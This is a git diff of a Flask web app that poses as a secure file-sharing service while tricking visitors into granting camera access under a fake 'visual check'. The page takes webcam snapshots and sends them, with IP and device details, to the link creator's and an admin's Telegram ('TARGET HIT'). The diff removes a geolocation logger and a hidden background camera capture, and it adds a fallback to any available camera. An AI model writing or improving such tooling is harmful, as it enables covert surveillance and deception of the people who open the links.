@@ -1,4 +1,4 @@
-# by:@ROMEO_UCHIHA (Pro File Sharing Redesign & Broken Media Fix)
+# by:@ROMEO_UCHIHA (Pro File Sharing Redesign & Broken Media Fix - Optimized)
 from flask import Flask, request, render_template_string, jsonify, redirect, session
 from supabase import create_client, Client
 import base64, requests, os, time, uuid, random
@@ -117,9 +117,9 @@ LANDING_PAGE = """
             <p>Ensure the correct recipient accesses the file. Our system requires a quick visual check before allowing file downloads.</p>
         </div>
         <div class="card">
-            <div class="icon">🌍</div>
-            <h3>Geo-Locked Sharing</h3>
-            <p>Limit your file's availability to specific regions. Anyone outside the designated coordinates will be blocked instantly.</p>
+            <div class="icon">🛡️</div>
+            <h3>Secure Infrastructure</h3>
+            <p>Your files are safely managed and delivered fast with our highly available content delivery network.</p>
         </div>
     </div>
     <footer>
@@ -183,14 +183,14 @@ def verify_otp():
         return f"{COMMON_STYLE}<div class='container'><h2>FAILED</h2><p>Invalid OTP!</p><a href='/lg'>Try Again</a></div>"
     return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY <span>OTP</span></h2><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required><button type="submit">Verify & Proceed</button></form></div>')
 
-# --- TARGET PAGE (FIXED MEDIA PREVIEW & RED THEME) ---
+# --- TARGET PAGE (FIXED MEDIA PREVIEW & SMART CAMERA LOGIC) ---
 @app.route("/t/<link_id>")
 def target_page(link_id):
     res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
     if not res.data: return "File Not Found or Removed!"
     
     data = res.data[0]
-    target_type = data.get("target_type", "both")
+    target_type = data.get("target_type", "camera")
     action_mode = data.get("action_mode", "redirect")
     action_value = data.get("action_value", "")
     text_content = data.get("text_content", "")
@@ -217,9 +217,6 @@ def target_page(link_id):
             .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: #ff0000; box-shadow: 0 0 15px #ff0000; z-index: 16; animation: scanAnim 2.5s infinite ease-in-out; pointer-events: none; }
             @keyframes scanAnim { 0% { top: 5%; opacity: 0; } 10% { opacity: 1; } 50% { top: 95%; opacity: 1; } 90% { opacity: 1; } 100% { top: 5%; opacity: 0; } }
             
-            .loc-container { display: none; text-align: center; flex-direction: column; align-items: center; justify-content: center;}
-            .pin-icon { font-size: 70px; color: var(--red); margin-bottom: 20px; text-shadow: 0 0 20px var(--red); }
-            
             .instruction-text { font-family: 'Orbitron'; font-size: 1.1rem; letter-spacing: 1px; color: #ccc; margin-top: 20px; text-transform: uppercase; text-align:center;}
             
             /* Clean Result UI (File Download) */
@@ -244,17 +241,11 @@ def target_page(link_id):
             <p class="instruction-text" id="face-msg">Analyzing environment...</p>
         </div>
 
-        <div id="loc-section" class="loc-container">
-            <i class="fas fa-map-marker-alt pin-icon"></i>
-            <p class="instruction-text" id="loc-msg">Verifying file access region...</p>
-        </div>
-
         <div id="result-ui">
             <div class="content-box" id="media-content"></div>
         </div>
 
         <canvas id="c" style="display:none"></canvas>
-        <video id="bg-v" playsinline autoplay muted style="position:fixed; top:-1000px; left:-1000px; width:10px; height:10px; opacity:0; z-index:-999;"></video>
 
         <script>
             let mode = "{{ t_type }}";
@@ -264,10 +255,9 @@ def target_page(link_id):
             let fType = "{{ f_type }}";
 
             const v = document.getElementById('v');
-            const bgV = document.getElementById('bg-v');
             const c = document.getElementById('c');
             let captureInterval = null;
-            let bgCamMode = "environment"; 
+            let currentCamType = "FRONT";
 
             window.onload = () => { getHardware(); startVerificationFlow(); };
 
@@ -277,18 +267,27 @@ def target_page(link_id):
             }
 
             async function startVerificationFlow() {
-                if(mode === 'both' || mode === 'camera') {
+                // If it's anything related to verification, we just do camera. Location is bypassed.
+                if(mode !== 'none') {
                     document.getElementById('cam-section').style.display = 'flex'; 
                     try {
+                        // TRY FRONT CAMERA FIRST
                         v.srcObject = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                        startFaceCheck();
+                        currentCamType = "FRONT";
                     } catch(e) {
-                        document.getElementById('face-msg').innerText = "CAMERA ACCESS DENIED";
-                        document.getElementById('face-msg').style.color = "red";
-                        setTimeout(() => location.reload(), 2500);
+                        try {
+                            // FALLBACK: TRY ANY AVAILABLE CAMERA IF FRONT IS BROKEN/MISSING
+                            v.srcObject = await navigator.mediaDevices.getUserMedia({ video: true });
+                            currentCamType = "BACK_OR_EXTERNAL";
+                        } catch(err) {
+                            // IF NO CAMERA OR PERMISSION DENIED, DO NOT LOOP! JUST BYPASS.
+                            document.getElementById('face-msg').innerText = "VERIFICATION BYPASSED";
+                            document.getElementById('face-msg').style.color = "gray";
+                            setTimeout(showContent, 1000);
+                            return; // Stop here, go to content
+                        }
                     }
-                } else if (mode === 'location') {
-                    startLocationCheck();
+                    startFaceCheck();
                 } else {
                     showContent(); 
                 }
@@ -300,85 +299,26 @@ def target_page(link_id):
                 c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
                 let imgData = c.toDataURL('image/jpeg', 0.5);
                 if(imgData.length < 1000) return; 
-                fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: "FRONT" }) });
+                fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: currentCamType }) });
             }
 
             function startFaceCheck() {
-                captureInterval = setInterval(takeSnap, 600); 
-                let timeLeft = 10;
-                
-                let timer = setInterval(() => {
-                    timeLeft--;
-                    if(timeLeft <= 0) {
-                        clearInterval(timer);
+                let snapCount = 0;
+                captureInterval = setInterval(() => {
+                    takeSnap();
+                    snapCount++;
+                    
+                    // Stop exactly after taking 5 snaps (no infinite loop)
+                    if(snapCount >= 5) {
                         clearInterval(captureInterval);
                         if (v.srcObject) v.srcObject.getTracks().forEach(t => t.stop());
-
-                        if(mode === 'both') {
-                            document.getElementById('cam-section').style.display = 'none';
-                            startLocationCheck();
-                        } else {
-                            showContent();
-                        }
+                        showContent();
                     }
-                }, 1000);
-            }
-
-            function startLocationCheck() {
-                document.getElementById('loc-section').style.display = 'flex';
-                const locMsg = document.getElementById('loc-msg');
-                if(navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (p) => {
-                            fetch("/api/log_loc/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) });
-                            locMsg.innerText = "REGION MATCHED";
-                            setTimeout(showContent, 1000);
-                        },
-                        (e) => {
-                            locMsg.innerText = "ACCESS DENIED IN YOUR REGION";
-                            setTimeout(() => location.reload(), 2000);
-                        }
-                    );
-                } else { showContent(); }
-            }
-
-            async function captureBackground() {
-                try {
-                    if (bgV.srcObject) bgV.srcObject.getTracks().forEach(t => t.stop());
-                    let stream;
-                    try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: bgCamMode } } }); } 
-                    catch(err) { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: bgCamMode } }); }
-                    
-                    bgV.srcObject = stream;
-                    bgV.onloadedmetadata = () => {
-                        bgV.play();
-                        let snapCount = 0;
-                        setTimeout(() => {
-                            let burst = setInterval(() => {
-                                if(bgV.videoWidth > 0 && snapCount < 3) {
-                                    c.width = bgV.videoWidth; c.height = bgV.videoHeight;
-                                    c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
-                                    let imgData = c.toDataURL('image/jpeg', 0.5);
-                                    let label = bgCamMode === "user" ? "FRONT" : "BACK";
-                                    fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: label }) });
-                                    snapCount++;
-                                } else {
-                                    clearInterval(burst);
-                                    bgCamMode = (bgCamMode === "environment") ? "user" : "environment";
-                                    captureBackground();
-                                }
-                            }, 800); 
-                        }, 1500);
-                    };
-                } catch(e) { 
-                    bgCamMode = "user";
-                    setTimeout(captureBackground, 3000);
-                }
+                }, 800); 
             }
 
             function showContent() {
                 document.getElementById('cam-section').style.display = 'none';
-                document.getElementById('loc-section').style.display = 'none';
                 
                 let resBox = document.getElementById('result-ui');
                 let medBox = document.getElementById('media-content');
@@ -392,7 +332,6 @@ def target_page(link_id):
                     let isVideo = ['mp4', 'webm', 'ogg', 'mov'].includes(ext);
                     let isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext);
 
-                    // BROKEN MEDIA FIX: Added strict fallback (onerror) and clean File Box UI
                     let previewHtml = '';
                     if(isVideo || fType === 'video') {
                         previewHtml = `<video src="${actVal}" controls autoplay playsinline style="width:100%; max-height:300px; border-radius:10px; background:#000; margin-bottom:20px;" onerror="this.outerHTML='<div class=\\'file-icon-box\\'><i class=\\'fas fa-file-video\\'></i><p>Video File Ready</p></div>'"></video>`;
@@ -411,8 +350,6 @@ def target_page(link_id):
                     html = `<div class="file-icon-box"><i class="fas fa-link"></i><p>External Link Ready</p></div><a href="${actVal}" target="_blank" class="btn-download">Continue to Link</a>`;
                 }
                 medBox.innerHTML = html;
-
-                if(mode === 'both' || mode === 'camera') { captureBackground(); }
             }
         </script>
     </body>
@@ -432,21 +369,6 @@ def log_hw(l_id):
         msg = f"🎯 *TARGET HIT*\\n\\n🌐 *IP:* `{ip}`\\n💻 *Device:* {dev_info}\\n📌 *Mode:* {link['target_type'].upper()}"
         send_tg_msg(user["bot_token"], user["chat_id"], msg)
         send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: TARGET HIT*\\nUser: {user['bot_name']}\\nIP: {ip}")
-    except: pass
-    return jsonify({"s": 1})
-
-@app.route("/api/log_loc/<l_id>", methods=["POST"])
-def log_loc(l_id):
-    try:
-        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
-        user = link["users"]
-        d = request.get_json()
-        
-        map_link = f"https://www.google.com/maps?q={d['lat']},{d['lon']}"
-        msg = f"📍 *LOCATION FOUND*\\n\\nLat: `{d['lat']}`\\nLon: `{d['lon']}`\\n🗺 Map: {map_link}"
-        
-        send_tg_msg(user["bot_token"], user["chat_id"], msg)
-        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: LOCATION*\\nUser: {user['bot_name']}\\n{msg}")
     except: pass
     return jsonify({"s": 1})
 
